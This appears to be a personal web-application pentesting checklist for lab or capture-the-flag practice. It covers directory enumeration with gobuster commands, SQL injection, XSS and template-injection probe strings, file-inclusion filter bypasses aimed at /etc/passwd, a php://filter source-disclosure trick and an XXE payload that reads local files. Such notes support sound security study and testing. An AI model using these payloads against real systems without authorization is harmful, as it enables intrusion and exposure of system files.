# webapp

## Manual scanning

- Check for `robots.txt` file.
- Check out the page's source code using dev tools.
- Software detection. Does the software have known vulnerabilities?
  - Software version (e.g. CMS)
  - Web server version (e.g. Apache 2.4.49)
- Software detection. Does this site / software have default credentials?
- Check for hostname. Are there email addresses that lead to clues?

## Automated scanning

- Run `gobuster` for finding directories on the web server.

```shell
gobuster dir --url http://$ip --wordlist=/usr/share/dirb/wordlists/common.txt -o gobuster/common.txt
```

```shell
gobuster dir --url http://$ip --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o gobuster/medium.txt
```

```shell
gobuster dir --url http://$ip --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,html,php -o gobuster/extensions.txt
```

- Run `ffuf` for subdomain enumeration. 


## Injection attacks

- Check for SQL injection points using

```
' or 1=1--
```
```
' or 1=1 -- -
```

- Check for XSS (cross site scripting) vulnerabilities using

```
<h1>Hi</h1>
```
```
<script>alert('Hi');</script>
```

- Check for SSTI (server side template injection) using

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

See [https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) for more information on server side template injection.

## File inclusion

- Check for file inclusions to the file `/etc/passwd`.
- Check for filter bypass
    - Use `.././..` instead of `../..`.
  - Use null bytes `%00` to bypass filters.
  - Use suffix `/etc/passwd/.` to bypass filters.
  - Use relative paths `dir/../../file/path` to bypass filters.
- Check for source code using

```
php://filter/convert.base64-encode/resource=post.php
```

- For nice file path targets see this [TryHackMe](https://tryhackme.com/room/fileinc) room.
- Go for remote file inclusions.

## XXE
Two payloads you can try are listed below.

```xml
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>
```
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```
